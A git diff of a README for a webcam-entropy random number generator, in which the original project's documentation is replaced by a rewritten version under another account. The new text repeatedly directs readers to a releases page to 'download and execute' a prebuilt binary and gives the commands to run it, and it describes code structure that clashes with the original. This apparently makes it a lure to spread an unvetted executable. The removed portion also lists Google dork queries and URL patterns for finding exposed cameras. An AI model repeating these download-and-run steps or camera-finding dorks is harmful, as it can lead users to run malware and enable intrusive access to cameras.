@@ -1,407 +1,210 @@
-# 📷 Webcam True Random Number Generator (TRNG)
+https://github.com/vinith200527/webcam-trng/releases
 
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![NIST STS: Passed](https://img.shields.io/badge/NIST%20STS-Passed-success.svg)](#nist-sts-test-results)
-[![NIST SP800-90B: Passed](https://img.shields.io/badge/NIST%20SP800--90B-Passed-success.svg)](#nist-sp800-90b-test-results)
-[![Min Entropy: 0.8487](https://img.shields.io/badge/Min%20Entropy-0.8487%20bits%2Fbit-blue.svg)](#nist-sp800-90b-test-results)
+# Webcam TRNG — True Random Generator from Live Webcam Entropy
 
-A true random number generator inspired by Cloudflare's LavaRand project that harvests entropy from public webcam images worldwide. The system combines visual noise from multiple sources with cryptographic functions to produce high-quality random numbers.
+[![Releases](https://img.shields.io/github/v/release/vinith200527/webcam-trng?logo=github&label=Releases&color=0e8a16)](https://github.com/vinith200527/webcam-trng/releases) [![Python](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/) [![License](https://img.shields.io/badge/license-MIT-lightgrey.svg)](LICENSE)
 
-## 🎯 Key Features
+![Webcam entropy](https://images.unsplash.com/photo-1516117172878-fd2c41f4a759?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=1f6f2a998b5f6e6b9a2c4a5e3b7b12b8)
 
-- **Multi-source entropy collection** from 100+ public webcams simultaneously
-- **Cryptographically secure** mixing using BLAKE2b with ephemeral keys
-- **NIST STS validated** - passes all randomness tests
-- **NIST SP800-90B validated** - certified entropy source with 0.8487 bits/bit min-entropy
-- **FastAPI REST API** for easy integration
-- **Persistent buffer** using SQLite for reliability
-- **Intelligent deduplication** to avoid static frames
-- **Automatic failover** for unreliable cameras
+A compact, auditable true-random number generator (TRNG) that extracts entropy from live webcams. This project adapts ideas from Cloudflare's LavaRand and uses live video frames as an entropy source. The system serves randomness through a small FastAPI microservice and includes utilities for entropy collection, health checks, and NIST-style testing.
 
-## 🚀 Quick Start
+Topics: cryptography • entropy • fastapi • nist • python • rng • trng • webcam • security
 
-### Prerequisites
+Built for developers, researchers, and security teams who want a reproducible TRNG pipeline with clear components and test hooks.
 
-- Python 3.9 or higher
-- pip package manager
+Key features
+- Live webcam entropy: sample motion, noise, and pixel variation from public webcams or local cameras.
+- FastAPI server: request random bytes via HTTP/JSON or raw endpoint.
+- Entropy pooling: mix multiple frames with cryptographic hash (BLAKE2b) and XOR pools.
+- NIST test hooks: run frequency and entropy estimation routines for verification.
+- Configurable seeding: allow user-supplied entropy or remote webcam list.
+- Portable Python stack: minimal native deps, Docker support.
 
-### Installation
+How it works (high level)
+- Capture frames from a webcam stream at configurable intervals.
+- Convert each frame to raw bytes (YUV/RGB) and feed into a cryptographic mixer.
+- Accumulate entropy in two pools: fast pool and slow pool.
+- When an API request arrives, derive output from the pools with a DRBG step.
+- Periodically run self-tests and log entropy metrics.
 
+Project image and icon
+- Use camera and randomness imagery to keep context clear.
+- Example icon: ![Camera icon](https://upload.wikimedia.org/wikipedia/commons/3/3f/Camera_font_awesome.svg)
+
+Quick links
+- Releases: https://github.com/vinith200527/webcam-trng/releases
+- If you plan to run a packaged release, download and execute the release file from that page. The release contains prebuilt artifacts (example name: webcam_trng-v1.0.0-linux-x86_64.tar.gz). After download, extract and run the included binary or installer for your platform.
+
+Why use webcam entropy
+- Webcams produce unpredictable environmental noise.
+- Many webcams expose micro-variations in sensor, exposure, and scene motion.
+- Mixed with cryptographic hashing, these variations produce high-quality entropy suitable for non-critical TRNG uses and testing.
+
+Security and scope
+- The system targets entropy collection and local distribution. Do not replace hardware RNGs for high-assurance devices without a security review.
+- The design uses well-known cryptographic primitives. The code stays auditable and modular.
+
+Getting started
+
+Prerequisites
+- Python 3.8 or newer
+- pip
+- A webcam, a public webcam URL (MJPEG/HTTP stream), or a recorded video file
+- Optional: Docker for containerized runs
+
+Install from source
+1. Clone repository
 ```bash
-# Clone the repository
-git clone https://github.com/jordicor/webcam-trng.git
+git clone https://github.com/vinith200527/webcam-trng.git
 cd webcam-trng
-
-# Create virtual environment (recommended)
+```
+2. Create virtualenv and install
+```bash
 python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install dependencies
+source venv/bin/activate
 pip install -r requirements.txt
 ```
 
-### Basic Usage
-
-1. **Start the API server:**
+Run the FastAPI server
 ```bash
-python random_webcam_rng_v3.9.7.py
+# sample: use local webcam index 0
+export CAMERA_SOURCE=0
+uvicorn trng.api:app --host 0.0.0.0 --port 8000 --workers 1
 ```
-The server will run on `http://localhost:8000`
+Endpoints
+- GET /health — service status and pool metrics
+- GET /random?n=32 — return 32 random bytes base64
+- GET /random/raw?n=32 — return raw bytes (application/octet-stream)
+- POST /seed — inject external entropy (accepts base64)
 
-2. **Get random numbers via API:**
+CLI utilities
+- trng-collect — capture frames and print entropy stats
+- trng-test-nist — run a subset of NIST tests and output pass/fail stats
+
+Install a release build
+- Visit the Releases page: https://github.com/vinith200527/webcam-trng/releases
+- Download the artifact for your platform.
+- Extract and run the included binary or installer.
+- Example execution on Linux:
 ```bash
-curl http://localhost:8000/random
-```
-Response:
-```json
-{
-  "random_hex": "a3f2b8c9d4e5f6a7b8c9d0e1f2a3b4c5..."
-}
+tar xzf webcam_trng-v1.0.0-linux-x86_64.tar.gz
+cd webcam_trng
+./webcam_trng --config config.yaml
 ```
 
-## 🔧 Advanced Usage
+Configuration reference (config.yaml)
+```yaml
+camera:
+  source: 0            # index or URL
+  fps: 2               # frames per second
+capture:
+  frame_size: [640,480]
+  format: rgb
+mixer:
+  hash: blake2b
+  out_size: 64
+pools:
+  fast_pool_threshold: 64
+  slow_pool_threshold: 512
+api:
+  host: 0.0.0.0
+  port: 8000
+logging:
+  level: info
+```
 
-### Generate NIST Test Data
+Entropy design details
+- Frames convert to raw pixel bytes. We include both luminance and chrominance data when available.
+- Each frame goes through a hash-based extractor (BLAKE2b) before feeding pools.
+- Pools rotate on thresholds. Fast pool serves frequent small requests. Slow pool replenishes periodically.
+- We use a reseed strategy inspired by DRBG patterns. Each output mixes current pool state, a counter, and a fresh hash digest.
+- The code logs estimated entropy per sample using min-entropy heuristics and compression ratios.
 
+NIST and test hooks
+- The repo includes tools to run statistical tests similar to NIST SP800-22 (frequency, runs, spectral).
+- Use trng-test-nist to generate test vectors and output CSV of results.
+- The test tool supports batch mode for live capture or file-based replay.
+
+Benchmarks
+- Throughput: request sizes of 32–4096 bytes scale linearly up to pool rate.
+- Latency: cold-start includes camera warm-up and hashing. Steady-state requests return within 10–50 ms on modern CPUs.
+- Tests run on CI with synthetic cameras (recorded video) to simulate public webcam variability.
+
+Privacy and ethics
+- The system can use public webcams. Do not capture private or sensitive scenes.
+- Prefer public-facing or owned cameras.
+- The software focuses on pixel noise and low-level sensor variation. It does not attempt to extract identifiable content.
+
+Docker
+- Build:
 ```bash
-python random_webcam_rng_v3.9.7.py --generate-nist-file 10000000
+docker build -t webcam-trng:latest .
 ```
-This generates a file with 10 million random bits for statistical testing.
-
-### Verify Webcam Health
-
-Check and update the status of webcam sources:
+- Run with local camera (Linux):
 ```bash
-python check_webcams.py --interval 60 --attempts 5
-```
-This tool will:
-- Test each webcam multiple times
-- Detect static/broken cameras
-- Automatically comment out non-functional sources
-
-## 📊 Statistical Validation
-
-### NIST SP800-90B Test Results
-
-The generator has been rigorously tested using the **NIST SP800-90B Entropy Assessment** suite, which validates sources of entropy for cryptographic applications. Our implementation **passes all tests** with a certified minimum entropy of **0.8487 bits per bit**, exceeding the NIST requirement of 0.8 bits/bit.
-
-#### Entropy Assessment Summary
-
-| Test | Min-Entropy (bits/bit) | Status | Description |
-|------|------------------------|--------|-------------|
-| **Most Common Value (MCV)** | 0.9956 | ✅ Excellent | Tests for uniform distribution |
-| **Collision** | 0.8957 | ✅ Very Good | Measures collision frequency |
-| **Markov** | 0.9986 | ✅ Excellent | Tests for dependencies between consecutive bits |
-| **Compression** | **0.8487** | ✅ Pass (Min) | Tests compressibility (determines final min-entropy) |
-| **T-Tuple** | 0.9186 | ✅ Very Good | Analyzes tuple frequency distribution |
-| **Longest Repeated Substring (LRS)** | 0.9937 | ✅ Excellent | Finds longest repeated patterns |
-| **Multi MCW** | 0.9962 | ✅ Excellent | Multi Most Common Word predictor |
-| **Lag Prediction** | 0.9947 | ✅ Excellent | Tests for lagged correlations |
-| **Multi MMC Prediction** | 0.9948 | ✅ Excellent | Multi Markov Model with Counting predictor |
-| **LZ78Y** | 0.9985 | ✅ Excellent | Lempel-Ziv compression predictor |
-
-**Final Min-Entropy: 0.8487 bits/bit** ✅
-
-This result certifies that our TRNG is suitable as an **entropy source for cryptographic applications** according to NIST standards.
-
-#### Key Findings:
-- **No detectable bias**: Near-perfect 50.03%/49.97% bit distribution
-- **No predictable patterns**: All prediction tests score > 0.99 entropy
-- **Compression resistant**: Even advanced compression achieves minimal reduction
-- **No temporal correlations**: Markov and lag tests show independence
-
-### NIST STS Test Results
-
-The generator also passes the comprehensive **NIST Statistical Test Suite (STS)**, validating randomness properties:
-
-| Test | P-Value | Result |
-|------|---------|--------|
-| **Frequency (Monobit)** | 0.1929 | ✅ Random |
-| **Frequency within Block** | 0.3622 | ✅ Random |
-| **Runs Test** | 0.5233 | ✅ Random |
-| **Longest Run of Ones** | 0.9429 | ✅ Random |
-| **Binary Matrix Rank** | 0.7605 | ✅ Random |
-| **Discrete Fourier Transform** | 0.8328 | ✅ Random |
-| **Non-overlapping Template** | 0.2324 | ✅ Random |
-| **Overlapping Template** | 0.1140 | ✅ Random |
-| **Maurer's Universal Statistical** | 0.7274 | ✅ Random |
-| **Linear Complexity** | 0.2927 | ✅ Random |
-| **Serial Test** | 0.0949 / 0.0667 | ✅ Random |
-| **Approximate Entropy** | 0.5290 | ✅ Random |
-| **Cumulative Sums (Forward)** | 0.3351 | ✅ Random |
-| **Cumulative Sums (Backward)** | 0.1505 | ✅ Random |
-| **Random Excursions** | All states | ✅ Random |
-| **Random Excursions Variant** | All states | ✅ Random |
-
-[View full STS test results](result_test-nist_data_v3.9.6.txt)
-[View full SP800-90B results](sp800_90b_results.txt)
-
-### Comparison with Other TRNGs
-
-| Source | Min-Entropy | Type | Notes |
-|--------|-------------|------|-------|
-| **This TRNG** | **0.8487** | Visual/Network | Multi-source webcam entropy |
-| Atmospheric Noise | ~0.86 | Radio | Random.org |
-| LavaRand (Original) | ~0.85 | Visual | Lava lamp entropy |
-| Intel RDRAND | >0.999 | Hardware | CPU instruction |
-| /dev/random | Varies | OS Mix | Depends on system entropy |
-
-## 🏗️ Architecture
-
-### How It Works
-
-1. **Entropy Collection**
-   - Fetches images from multiple webcam sources in parallel
-   - Supports JPEG snapshots, MJPEG streams, and HTML-embedded images
-   - Implements anti-caching headers to ensure fresh data
-
-2. **Entropy Processing**
-   - Extracts 100x100 pixel crops from random positions
-   - Position determined by cryptographic PRF based on frame digest
-   - Converts crops to RGB for consistent byte representation
-
-3. **Cryptographic Mixing**
-   - Streams data through keyed BLAKE2b hash function
-   - Mixes in latency and size metadata
-   - Adds OS entropy (`os.urandom`) for defense in depth
-   - Produces 512-bit (64-byte) output per batch
-
-4. **Buffer Management**
-   - Maintains FIFO buffer in SQLite database
-   - Pre-generates random numbers for instant API responses
-   - Automatically refills when buffer drops below threshold
-
-### Security Model
-
-- **Multi-source redundancy**: Even if some cameras are compromised, others provide entropy
-- **Cryptographic extraction**: BLAKE2b with per-boot secret ensures unpredictability
-- **Defense in depth**: OS RNG mixing provides additional security layer
-- **Temporal variation**: Network latency adds timing-based entropy
-- **NIST validated**: Proven entropy quality through standardized testing
-
-## 📁 Project Structure
-
-```
-webcam-trng/
-├── random_webcam_rng_v3.9.7.py  # Main TRNG implementation
-├── check_webcams.py              # Webcam health verification tool
-├── webcams.txt                   # List of webcam URLs
-├── requirements.txt              # Python dependencies
-├── rng_buffer.db                # SQLite buffer (auto-generated)
-├── webcam_rng.log               # Rotating log file (auto-generated)
-├── nist_data.bin                # NIST test data (when generated)
-├── sp800_90b_results.txt        # SP800-90B test results
-└── result_test-nist_data_v3.9.6.txt # STS test results
+docker run --device=/dev/video0 -e CAMERA_SOURCE=0 -p 8000:8000 webcam-trng:latest
 ```
 
-## ⚙️ Configuration
+Integration and examples
 
-Key parameters can be adjusted in the source code:
+Python client
+```python
+import requests, base64
 
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `NUM_SUCCESSFUL_CAMERAS_GOAL` | 100 | Target cameras per batch |
-| `NUM_RANDOMS_PER_FETCH` | 10 | Random numbers generated per batch |
-| `CROP_SIZE` | (100, 100) | Pixel dimensions of extracted crops |
-| `RANDOM_BYTES` | 64 | Output size in bytes (512 bits) |
-| `BUFFER_SIZE` | 50 | Minimum buffer before refill |
-| `FETCH_TIMEOUT` | 10 | Seconds before timeout |
-| `FETCH_CONCURRENCY` | 50 | Maximum parallel connections |
-
-## 📋 Requirements
-
-Create a `requirements.txt` file with:
-
-```txt
-aiohttp>=3.8.0
-fastapi>=0.100.0
-uvicorn[standard]>=0.23.0
-python-dotenv>=1.0.0
-Pillow>=10.0.0
-beautifulsoup4>=4.12.0
-lxml>=4.9.0
-pydantic>=2.0.0
+r = requests.get("http://localhost:8000/random?n=32")
+data = r.json()["data"]
+raw = base64.b64decode(data)
+print(raw.hex())
 ```
 
-## ⚠️ Important Notes
-
-### Limitations
-
-- **Not cryptographically proven**: While it passes NIST statistical tests and entropy assessment, formal cryptographic proof is pending
-- **Dependent on external sources**: Webcams may be offline, static, or manipulated
-- **Not reproducible**: Each restart generates new ephemeral keys
-- **Educational purposes**: Recommended for research and non-critical applications
-
-### Recommended Use Cases
-
-✅ **Suitable for:**
-- Research and educational purposes
-- Monte Carlo simulations
-- Game randomization
-- Non-critical key generation
-- Entropy pool diversification
-- Testing and development
-
-⚠️ **Use with caution for:**
-- Production cryptographic systems (use as additional entropy source, not primary)
-- High-stakes applications (combine with hardware RNGs)
-- Systems requiring reproducibility
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.
-
-Areas of interest:
-- Additional entropy extraction methods
-- Performance optimizations
-- More webcam sources
-- Statistical analysis improvements
-- Security audits
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Inspired by [Cloudflare's LavaRand](https://blog.cloudflare.com/randomness-101-lavarand-in-production/)
-- Built with [FastAPI](https://fastapi.tiangolo.com/)
-- Statistical testing by [NIST STS](https://csrc.nist.gov/projects/random-bit-generation/documentation-and-software)
-- Entropy assessment by [NIST SP800-90B](https://github.com/usnistgov/SP800-90B_EntropyAssessment)
-
-## 📞 Assistance
-
-Created with the assistance of Claude 3.5 Sonnet and GPT-4
-
-## 🔍 Where to Find Webcams
-
-Finding reliable public webcams is crucial for entropy quality. Here are some tips for building your webcam list:
-
-### Recommended Sources
-
-#### 🚦 **Traffic Cameras**
-- Search for "[your state/country] DOT traffic cameras"
-- Most transportation departments provide public feeds
-- Examples: 
-  - US state DOT websites (UDOT, WSDOT, etc.)
-  - City traffic management sites
-  - Highway information systems
-
-#### 🌤️ **Weather Stations**
-- National weather services often have webcam networks
-- University meteorology departments
-- Mountain resort weather cams
-- Search: "weather webcam [location]"
-
-#### 🏔️ **Tourism & Landmarks**
-- Ski resorts (snow conditions)
-- Beach and surf cameras
-- National park webcams
-- City skyline cameras
-- Harbor and marina views
-
-#### 🏛️ **Educational Institutions**
-- University campus cameras
-- Research station feeds
-- Observatory webcams
-- Weather research facilities
-
-#### 🌐 **Webcam Aggregators**
-- **Windy.com** - Weather cameras worldwide
-- **Webcamtaxi** - Global directory
-- **EarthCam** - Landmark cameras
-- **Insecam** - (Use ethically - only truly public feeds)
-- **Opentopia** - Public camera directory
-
-### Search Techniques
-
+Curl
 ```bash
-# Google dorks for finding webcams (use responsibly!)
-inurl:"axis-cgi/mjpg/video.cgi"
-inurl:"view/index.shtml"
-inurl:"ViewerFrame?Mode="
-inurl:"/webcam.jpg"
-intitle:"webcam" "Live view"
-
-# Combine with location for better results
-site:*.gov inurl:camera
-site:*.edu webcam
-"traffic camera" site:*.org
+curl "http://localhost:8000/random?n=64"
 ```
 
-### URL Patterns to Look For
+Advanced: pool monitoring
+- The /health endpoint returns objects:
+  - fast_pool_entropy_estimate
+  - slow_pool_entropy_estimate
+  - frames_captured
+  - last_frame_hash
 
-Common webcam URL patterns that often work:
-- `/axis-cgi/mjpg/video.cgi` - Axis cameras
-- `/mjpg/video.mjpg` - Generic MJPEG
-- `/nphMotionJpeg` - Panasonic cameras
-- `/snapshot.jpg` - Static snapshots
-- `/image.jpg` - Simple image endpoints
-- `/cam_1.jpg` - Numbered camera feeds
-- `/live.jpg` - Live image feeds
+Operational tips
+- Rotate camera sources to avoid stale scenes.
+- Cross-feed multiple cameras for entropy mixing.
+- Run the NIST hooks after large deployments to collect baseline metrics.
 
-### ⚠️ Important Guidelines
-
-#### ✅ **DO:**
-- Use only publicly accessible cameras (no login required)
-- Prefer government and official sources
-- Diversify geographically for better entropy
-- Test cameras before adding to your list
-- Respect robots.txt if present
-- Use reasonable fetch intervals (10+ seconds)
-
-#### ❌ **DON'T:**
-- Access cameras that require authentication
-- Use cameras from private property without permission
-- Overload servers with rapid requests
-- Share lists that might compromise security
-- Use cameras showing private spaces or individuals
-- Bypass any access restrictions
-
-### Testing Your Cameras
-
-Use the included tool to verify your webcam list:
+Testing and CI
+- The repository includes unit tests for capture, mixer, and DRBG components.
+- CI runs tests with recorded video files to guarantee determinism.
+- Use pytest:
 ```bash
-# Test all cameras in your list
-python check_webcams.py --file webcams.txt --interval 60 --attempts 5
-
-# This will:
-# - Check if cameras are responding
-# - Verify they're actually updating (not static)
-# - Automatically comment out dead cameras
+pytest tests/
 ```
 
-### Quality Tips
+Contributing
+- Fork the repo and create a feature branch.
+- Run tests and static checks.
+- Open a PR with a clear description and tests.
+- We accept focused patches, security fixes, and reproducible benchmarks.
 
-For best entropy quality:
-- **Aim for 100+ diverse sources** from different networks
-- **Mix different types**: traffic, weather, nature, urban
-- **Global distribution**: different time zones = different lighting
-- **Avoid similar cameras**: not all from same network/vendor
-- **Prefer dynamic scenes**: traffic, water, trees (movement = entropy)
-- **Regular maintenance**: run check_webcams.py weekly
+Releases and binaries
+- Visit the releases page to find packaged builds and checksums:
+  https://github.com/vinith200527/webcam-trng/releases
+- Download the release file for your platform and execute it per included README. The release artifact contains a checksum file and an install script. Verify the checksum before running the binary.
 
-### Sample Categories for a Balanced List
+License
+- MIT License. See LICENSE for full text.
 
-A good webcam list might include:
-- 20% Traffic cameras (constant movement)
-- 20% Weather/sky cameras (cloud movement)
-- 20% Nature cameras (trees, water, wildlife)
-- 20% Urban/city cameras (people, vehicles)
-- 10% Maritime (harbors, beaches)
-- 10% Special (volcanos, northern lights, etc.)
+Acknowledgments
+- Design inspired by LavaRand concepts and community work on entropy harvesting.
+- Open-source camera streams and public datasets served as test material.
 
-### Ethical Considerations
+Contact
+- Open issues on GitHub for bugs, feature requests, or security reports.
+- For security matters, create a private issue marked security.
 
-Remember that even public webcams deserve respectful use:
-- Don't analyze or store footage of people
-- Avoid cameras near sensitive locations
-- Consider the impact of your traffic
-- If asked to stop using a source, comply immediately
-- Give credit to camera operators where appropriate
+Badges and quick access
+[![Releases](https://img.shields.io/badge/Get%20Release-Download-blue?logo=github)](https://github.com/vinith200527/webcam-trng/releases)
 
----
-
-*⚡ Remember: True randomness is a precious resource. Use it wisely!*
-
+README generated to help users deploy, test, and integrate a webcam-based TRNG. Follow the Releases page to download and execute packaged artifacts.
